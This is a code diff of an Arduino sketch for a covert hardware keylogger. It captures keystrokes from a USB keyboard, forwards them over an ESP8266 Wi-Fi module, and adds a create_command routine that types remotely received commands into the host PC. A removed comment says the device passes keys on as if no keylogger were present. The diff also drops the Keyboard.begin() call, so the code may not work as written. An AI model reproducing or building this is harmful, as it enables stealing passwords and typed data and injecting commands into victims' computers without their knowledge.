@@ -1,34 +1,21 @@
-// make sure to copy whole folder, not just this sketch
+#include <NeoSWSerial.h> // https://github.com/SlashDevin/NeoSWSerial
+#include "C_USBhost.h"
+#include <Keyboard.h>
 
-#include <SoftwareSerial.h>             // library required for serial communication using almost(!) any Digital I/O pins of Arduino
-#include <Keyboard.h>                   // library that contains all the HID functionality necessary to pass-on the typed and logged keys to the PC
-#include "C_USBhost.h"                  // class used to make the code more clear
+#define BAUD_RATE 9600
+#define BAUD_RATE_USB_HOST_BOARD 115200
 
-SoftwareSerial Esp8266(8, 9); // CJMCU - MO(16), SCK(15) 
-C_USBhost USBhost = C_USBhost(Serial1, /*debug_state*/false);            // communication with USB host board (receiving input from keyboard), connected to RX/TX of Arduino Pro Micro
-
-/*    
-    [ CJMCU Beetle   ->   Usb Host Mini Board ]   // Vertical lines indicate that the connection is made on the same module
-              GND    ->    0V (GND)
-                              |
-                         4.7K resistor
-                              |
-                             RX
-                             
-              RX    ->    TX
-              TX    ->    2K resistor -> RX
-              5V    ->    5V   
-
-*/
-
-#define BAUD_RATE_ESP8266 9600                      // default was 9600 
-#define BAUD_RATE_USB_HOST_BOARD 115200              // default was 9600
-#define BAUD_RATE_SERIAL 115200
+NeoSWSerial Esp8266(8, 9);
+C_USBhost USBhost = C_USBhost(Serial1, /*debug_state*/false);
 
 String bufferStr = "";
 String last = "";
+char letter;
+char buffalo[315];
+int x = 0;
+int z = 0;
 
-int defaultDelay = 0;
+uint8_t defaultDelay = 0;
 
 void Line(String _line)
 {
@@ -71,7 +58,6 @@ void Line(String _line)
   delay(defaultDelay);
 }
 
-
 void Press(String b){
   if(b.length() == 1) Keyboard.press(char(b[0]));
   else if (b.equals("ENTER")) Keyboard.press(KEY_RETURN);
@@ -109,13 +95,55 @@ void Press(String b){
   //else Serial.println("not found :'"+b+"'("+String(b.length())+")");
 }
 
+void create_command(char command, int y) {
+  Serial.println(x);
+  Serial.println(y);
+  buffalo[x] += command;
+  x++;
+
+  if(y == 1){
+    Serial.print(buffalo);
+    for (int x=0; x < sizeof(buffalo); x++){
+      bufferStr += buffalo[x];
+      Serial.println(bufferStr);
+    }
+    memset(buffalo, 0, sizeof(buffalo));
+    z = 0;
+    x = 0;
+  }
+
+  if(bufferStr.length() > 0){
+
+    bufferStr.replace("<","");
+    bufferStr.replace("\r","\n");
+    bufferStr.replace("\n\n","\n");
+    
+    while(bufferStr.length() > 0){
+      int latest_return = bufferStr.indexOf("\n");
+      if(latest_return == -1){
+        Serial.println("run: "+bufferStr);
+        Line(bufferStr);
+        bufferStr = "";
+      } else{
+        Serial.println("run: '"+bufferStr.substring(0, latest_return)+"'");
+        Line(bufferStr.substring(0, latest_return));
+        last=bufferStr.substring(0, latest_return);
+        bufferStr = bufferStr.substring(latest_return + 1);
+      }
+    }
+    
+    bufferStr = "";
+    Serial.println("done");
+  }
+  
+}
+
 void setup() {
-  delay(1000);                                                // probably useless, but it allows some time for the USB host board and Sim800L to initialize 
-  Serial.begin(BAUD_RATE_SERIAL);                             // begin serial communication with PC (so Serial Monitor could be opened and the developer could see what is actually going on in the code)                          
-  Esp8266.begin(BAUD_RATE_ESP8266);
+  Esp8266.begin(BAUD_RATE);
+  Esp8266.setTimeout(1000);
+  Serial.begin(BAUD_RATE);
   USBhost.Begin(BAUD_RATE_USB_HOST_BOARD);                    // begin serial communication with USB host board in order to receive key bytes from the keyboard connected to it
   USBhost.SetMode('6');
-  Keyboard.begin();                                           // start HID functionality, it will allow to type keys to the PC just as if there was no keylogger at all
 }
 
 void loop() {
@@ -152,34 +180,14 @@ void loop() {
         default: Esp8266.print(char(d)); break;
     }
   }
-
+  
   if(Esp8266.available()) {
-  bufferStr = Esp8266.readStringUntil("END");
-  Serial.println(bufferStr);
+    letter = Esp8266.read();
+    Serial.write(letter);
+    if(letter == '<') {
+      z = 1;
+    }
+    create_command(letter, z);
   }
   
-  if(bufferStr.length() > 0){
-    
-    bufferStr.replace("\r","\n");
-    bufferStr.replace("\n\n","\n");
-    
-    while(bufferStr.length() > 0){
-      int latest_return = bufferStr.indexOf("\n");
-      if(latest_return == -1){
-        Serial.println("run: "+bufferStr);
-        Line(bufferStr);
-        bufferStr = "";
-      } else{
-        Serial.println("run: '"+bufferStr.substring(0, latest_return)+"'");
-        Line(bufferStr.substring(0, latest_return));
-        last=bufferStr.substring(0, latest_return);
-        bufferStr = bufferStr.substring(latest_return + 1);
-      }
-    }
-    
-    bufferStr = "";
-    //Esp8266.write(0x99);
-    Serial.println("done");
-  }
 }
-
